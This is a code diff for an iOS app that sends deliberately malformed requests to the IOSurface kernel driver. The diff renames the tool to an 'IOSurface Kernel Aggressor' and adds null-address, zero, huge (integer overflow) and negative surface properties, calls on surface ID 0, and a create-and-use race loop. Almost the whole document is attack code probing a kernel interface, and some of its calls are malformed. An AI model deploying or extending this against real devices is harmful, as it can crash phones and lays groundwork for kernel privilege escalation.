@@ -39,20 +39,20 @@
     self.window.rootViewController = vc;
     [self.window makeKeyAndVisible];
     
-    [self log:@"=== IOSurface Kernel Error Trigger ==="];
+    [self log:@"=== IOSurface Kernel Aggressor ==="];
     
     struct utsname uts;
     uname(&uts);
     [self log:[NSString stringWithFormat:@"Device: %s | iOS: %@", uts.machine, [[UIDevice currentDevice] systemVersion]]];
     
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
-        [self triggerIOSSurfaceErrors];
+        [self attackIOSurface];
     });
     
     return YES;
 }
 
-- (void)triggerIOSSurfaceErrors {
+- (void)attackIOSurface {
     // Step 1: Open IOSurfaceRoot
     [self log:@"[1] Opening IOSurfaceRoot..."];
     io_service_t root = IOServiceGetMatchingService(0, IOServiceMatching("IOSurfaceRoot"));
@@ -70,91 +70,103 @@
     }
     [self log:@"PASS: IOSurfaceRoot opened"];
     
-    // Step 2: Try to create surface with ID 0 (should trigger kernel error)
-    [self log:@"[2] Creating surface with properties designed to trigger kernel error..."];
+    // Step 2: Trigger SID: 0x0 error with surface ID 0
+    [self log:@"[2] Triggering SID: 0x0 error..."];
     
-    // Craft properties that might cause SID: 0x0 error
+    // Try to use surface ID 0 directly (the error we saw in logs)
+    uint32_t surface_id = 0;
+    
+    // Craft properties that might cause buffer: 0x0
     NSDictionary *props = @{
         @"IOSurfaceIsGlobal": @YES,
         @"IOSurfaceWidth": @256,
         @"IOSurfaceHeight": @256,
         @"IOSurfaceAllocSize": @65536,
         @"IOSurfacePixelFormat": @1111970369,
-        // Try to trigger the buffer: 0x0 error
-        @"IOSurfaceAddress": @0,
+        @"IOSurfaceAddress": @0,  // Null address to trigger buffer: 0x0
         @"IOSurfaceOffset": @0,
     };
     
-    uint32_t surface_id = 0;
     kr = IOConnectCallMethod(conn, 0, NULL, 0,
         (__bridge CFDictionaryRef)props, sizeof(props),
         NULL, NULL, &surface_id, NULL);
     
-    [self log:[NSString stringWithFormat:@"Surface create result: 0x%x (ID: %u)", kr, surface_id]];
+    [self log:[NSString stringWithFormat:@"Create with null addr: 0x%x (ID: %u)", kr, surface_id]];
     
     // Step 3: Try multiple variations to trigger different kernel errors
-    [self log:@"[3] Trying variations to trigger kernel errors..."];
+    [self log:@"[3] Firing variations..."];
     
-    // Variation 1: Minimal properties
-    NSDictionary *minimal = @{
-        @"IOSurfaceWidth": @1,
-        @"IOSurfaceHeight": @1,
-        @"IOSurfaceAllocSize": @1,
-    };
-    uint32_t sid1 = 0;
-    kr = IOConnectCallMethod(conn, 0, NULL, 0,
-        (__bridge CFDictionaryRef)minimal, sizeof(minimal),
-        NULL, NULL, &sid1, NULL);
-    [self log:[NSString stringWithFormat:@"Minimal surface: 0x%x (ID: %u)", kr, sid1]];
-    
-    // Variation 2: Large dimensions (potential integer overflow)
-    NSDictionary *large = @{
-        @"IOSurfaceWidth": @0x10000,
-        @"IOSurfaceHeight": @0x10000,
-        @"IOSurfaceAllocSize": @0x10000000,
-    };
-    uint32_t sid2 = 0;
-    kr = IOConnectCallMethod(conn, 0, NULL, 0,
-        (__bridge CFDictionaryRef)large, sizeof(large),
-        NULL, NULL, &sid2, NULL);
-    [self log:[NSString stringWithFormat:@"Large surface: 0x%x (ID: %u)", kr, sid2]];
-    
-    // Variation 3: Zero dimensions
+    // Variation A: Zero everything
     NSDictionary *zero = @{
         @"IOSurfaceWidth": @0,
         @"IOSurfaceHeight": @0,
         @"IOSurfaceAllocSize": @0,
     };
-    uint32_t sid3 = 0;
+    uint32_t sid_a = 0;
     kr = IOConnectCallMethod(conn, 0, NULL, 0,
         (__bridge CFDictionaryRef)zero, sizeof(zero),
-        NULL, NULL, &sid3, NULL);
-    [self log:[NSString stringWithFormat:@"Zero surface: 0x%x (ID: %u)", kr, sid3]];
+        NULL, NULL, &sid_a, NULL);
+    [self log:[NSString stringWithFormat:@"Zero surface: 0x%x (ID: %u)", kr, sid_a]];
+    
+    // Variation B: Huge dimensions (integer overflow attempt)
+    NSDictionary *huge = @{
+        @"IOSurfaceWidth": @0x10000,
+        @"IOSurfaceHeight": @0x10000,
+        @"IOSurfaceAllocSize": @0x10000000,
+    };
+    uint32_t sid_b = 0;
+    kr = IOConnectCallMethod(conn, 0, NULL, 0,
+        (__bridge CFDictionaryRef)huge, sizeof(huge),
+        NULL, NULL, &sid_b, NULL);
+    [self log:[NSString stringWithFormat:@"Huge surface: 0x%x (ID: %u)", kr, sid_b]];
+    
+    // Variation C: Negative-ish values
+    NSDictionary *neg = @{
+        @"IOSurfaceWidth": @-1,
+        @"IOSurfaceHeight": @-1,
+        @"IOSurfaceAllocSize": @-1,
+    };
+    uint32_t sid_c = 0;
+    kr = IOConnectCallMethod(conn, 0, NULL, 0,
+        (__bridge CFDictionaryRef)neg, sizeof(neg),
+        NULL, NULL, &sid_c, NULL);
+    [self log:[NSString stringWithFormat:@"Negative surface: 0x%x (ID: %u)", kr, sid_c]];
     
     // Step 4: Try to use surface ID 0 directly (trigger the kernel error we saw)
-    [self log:@"[4] Attempting to use surface ID 0..."];
+    [self log:@"[4] Attacking surface ID 0..."];
     
     // Try to lock surface ID 0
-    uint32_t seed = 0;
-    kr = IOConnectCallMethod(conn, 1, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
+    uint64_t input0[1] = {0};
+    kr = IOConnectCallMethod(conn, 1, input0, 1, NULL, 0, NULL, NULL, NULL, NULL);
     [self log:[NSString stringWithFormat:@"Lock surface 0: 0x%x", kr]];
     
-    // Step 5: Check if we can trigger the fClientTask error
-    [self log:@"[5] Testing fClientTask validation..."];
+    // Try to get base address of surface 0
+    kr = IOConnectCallMethod(conn, 2, input0, 1, NULL, 0, NULL, NULL, NULL, NULL);
+    [self log:[NSString stringWithFormat:@"Get base addr of 0: 0x%x", kr]];
     
-    // Create a surface, then try to access it from a different "task" context
-    if (surface_id > 0) {
-        [self log:[NSString stringWithFormat:@"Created surface ID %u, testing access...", surface_id]];
-        
-        // Try to get base address
-        void *base = NULL;
-        kr = IOConnectCallMethod(conn, 2, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
-        [self log:[NSString stringWithFormat:@"Get base address: 0x%x", kr]];
+    // Step 5: Rapid create/destroy to trigger race
+    [self log:@"[5] Race condition test..."];
+    for (int i = 0; i < 10; i++) {
+        uint32_t sid = 0;
+        NSDictionary *p = @{
+            @"IOSurfaceWidth": @64,
+            @"IOSurfaceHeight": @64,
+            @"IOSurfaceAllocSize": @4096,
+        };
+        kr = IOConnectCallMethod(conn, 0, NULL, 0,
+            (__bridge CFDictionaryRef)p, sizeof(p),
+            NULL, NULL, &sid, NULL);
+        if (kr == KERN_SUCCESS) {
+            [self log:[NSString stringWithFormat:@"Created surface %d: ID %u", i, sid]];
+            // Immediately try to use it
+            uint64_t input[1] = {sid};
+            IOConnectCallMethod(conn, 1, input, 1, NULL, 0, NULL, NULL, NULL, NULL);
+        }
     }
     
     IOServiceClose(conn);
-    [self log:@"=== Trigger Complete ==="];
-    [self log:@"Check Console for kernel(IOSurface) errors"];
+    [self log:@"=== Attack Complete ==="];
+    [self log:@"Check Console for kernel(IOSurface) errors with our PID"];
 }
 
 @end
